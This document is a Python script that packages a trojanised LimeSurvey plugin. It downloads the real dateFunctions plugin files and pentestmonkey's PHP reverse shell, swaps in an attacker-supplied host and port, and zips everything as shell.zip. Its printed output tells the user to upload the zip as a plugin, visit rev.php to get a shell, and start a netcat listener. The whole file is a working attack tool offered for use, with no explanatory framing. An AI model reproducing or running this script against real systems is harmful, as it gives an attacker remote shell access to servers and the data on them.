import requests
import os
import shutil
import argparse

def prep(rhost, rport):
	os.makedirs("./dateFunctions", exist_ok=True)
	with open("./dateFunctions/EMFunctions.php","w") as f:
		f.write(requests.get("https://raw.githubusercontent.com/LimeSurvey/LimeSurvey/aa8d4d68c2e4bcff9e30abe94bcd55aed35e9b12/application/core/plugins/dateFunctions/EMFunctions.php").text)
	with open("./dateFunctions/dateFunctions.php", "w") as f:
		f.write(requests.get("https://raw.githubusercontent.com/LimeSurvey/LimeSurvey/aa8d4d68c2e4bcff9e30abe94bcd55aed35e9b12/application/core/plugins/dateFunctions/dateFunctions.php").text)
	with open("./dateFunctions/config.xml", "w") as f:
		f.write(requests.get("https://raw.githubusercontent.com/LimeSurvey/LimeSurvey/aa8d4d68c2e4bcff9e30abe94bcd55aed35e9b12/application/core/plugins/dateFunctions/config.xml").text)
	with open("./dateFunctions/rev.php", "w") as f:
		f.write(requests.get("https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php").text.replace("127.0.0.1",rhost).replace("1234",rport))
	shutil.make_archive("shell", 'zip', "./dateFunctions/")

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("rhost")
	parser.add_argument("rport")
	args = parser.parse_args()
	prep(args.rhost, args.rport)
	print(f"done!\nthe file is shell.zip, you will have to upload it in your limesurvey plugins.\nWhen you are done, just visit http://LIMESURVEY_TARGET_PATH/upload/plugins/dateFunctions/rev.php, and you will get a shell! Don't forget to open a listener with nc -lnvp {args.rport}")


if __name__ == '__main__':
	main()
